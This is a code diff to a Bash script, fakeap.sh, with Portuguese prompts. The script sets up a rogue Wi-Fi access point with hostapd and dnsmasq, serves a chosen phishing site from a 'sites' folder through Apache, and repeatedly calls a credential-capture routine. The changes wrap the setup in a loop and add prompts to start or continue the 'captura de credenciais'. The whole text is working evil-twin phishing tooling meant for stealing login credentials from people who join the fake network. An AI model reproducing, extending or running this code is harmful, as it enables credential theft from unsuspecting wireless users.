@@ -93,22 +93,14 @@ stop() {
 }
 
 start() {
-  if [[ -e credentials.txt ]]; then
-    rm -rf credentials.txt
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Deseja iniciar a captura de credenciais? (s/n):\e[0m ' start_capture
+  if [[ "$start_capture" != "s" ]]; then
+    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Captura cancelada pelo usuário.\n"
+    exit 1
   fi
 
   if [ ! -d "sites" ]; then
     mkdir sites
-  fi
-
-  find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("\e[1;92m%d\e[0m: \e[1;77m%s\n", NR, $1)}'
-
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta pelo número:\e[0m ' chosen_folder_number
-  chosen_folder=$(find sites/ -maxdepth 1 -mindepth 1 -type d | sed -n "${chosen_folder_number}p")
-
-  if [ -z "$chosen_folder" ]; then
-    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
-    exit 1
   fi
 
   interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
@@ -116,38 +108,59 @@ start() {
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
 
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o access point...\n"
+  while true; do
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o access point...\n"
 
-  service network-manager stop
-  airmon-ng check kill
-  ifconfig $interface down
-  iwconfig $interface mode monitor
-  ifconfig $interface up
-  iwconfig $interface channel $use_channel
-  iwconfig $interface essid $use_ssid
-  ifconfig $interface up
+    service network-manager stop
+    airmon-ng check kill
+    ifconfig $interface down
+    iwconfig $interface mode monitor
+    ifconfig $interface up
+    iwconfig $interface channel $use_channel
+    iwconfig $interface essid $use_ssid
+    ifconfig $interface up
 
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\n"
-  
-  echo "interface=$interface" > hostapd.conf
-  echo "driver=nl80211" >> hostapd.conf
-  echo "ssid=$use_ssid" >> hostapd.conf
-  echo "hw_mode=g" >> hostapd.conf
-  echo "channel=$use_channel" >> hostapd.conf
-  echo "macaddr_acl=0" >> hostapd.conf
-  echo "auth_algs=1" >> hostapd.conf
-  echo "ignore_broadcast_ssid=0" >> hostapd.conf
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\n"
+    
+    echo "interface=$interface" > hostapd.conf
+    echo "driver=nl80211" >> hostapd.conf
+    echo "ssid=$use_ssid" >> hostapd.conf
+    echo "hw_mode=g" >> hostapd.conf
+    echo "channel=$use_channel" >> hostapd.conf
+    echo "macaddr_acl=0" >> hostapd.conf
+    echo "auth_algs=1" >> hostapd.conf
+    echo "ignore_broadcast_ssid=0" >> hostapd.conf
 
-  dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-  sleep 5
+    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+    sleep 5
 
-  # Copiar todos os arquivos da pasta escolhida para /var/www/html
-  cp -r "sites/$chosen_folder"/* /var/www/html
+    find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("\e[1;92m%d\e[0m: \e[1;77m%s\n", NR, $1)}'
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta pelo número:\e[0m ' chosen_folder_number
+    chosen_folder=$(find sites/ -maxdepth 1 -mindepth 1 -type d | sed -n "${chosen_folder_number}p")
 
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Iniciando Apache2...\n"
-  service apache2 start
+    if [ -z "$chosen_folder" ]; then
+      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
+      exit 1
+    fi
 
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Para parar: ./fakeap.sh --stop\n"
+    # Copiar todos os arquivos da pasta escolhida para /var/www/html
+    cp -r "sites/$chosen_folder"/* /var/www/html
+
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Iniciando Apache2...\n"
+    service apache2 start
+
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Para parar: ./fakeap.sh --stop\n"
+    
+    # Aguardar a captura de credenciais
+    getcredentials
+
+    # Perguntar se deseja continuar a captura
+    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Deseja continuar a captura de credenciais? (s/n):\e[0m ' continue_capture
+    if [[ "$continue_capture" != "s" ]]; then
+      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Captura encerrada pelo usuário.\n"
+      exit 1
+    fi
+  done
 }
 
 catch_cred() {
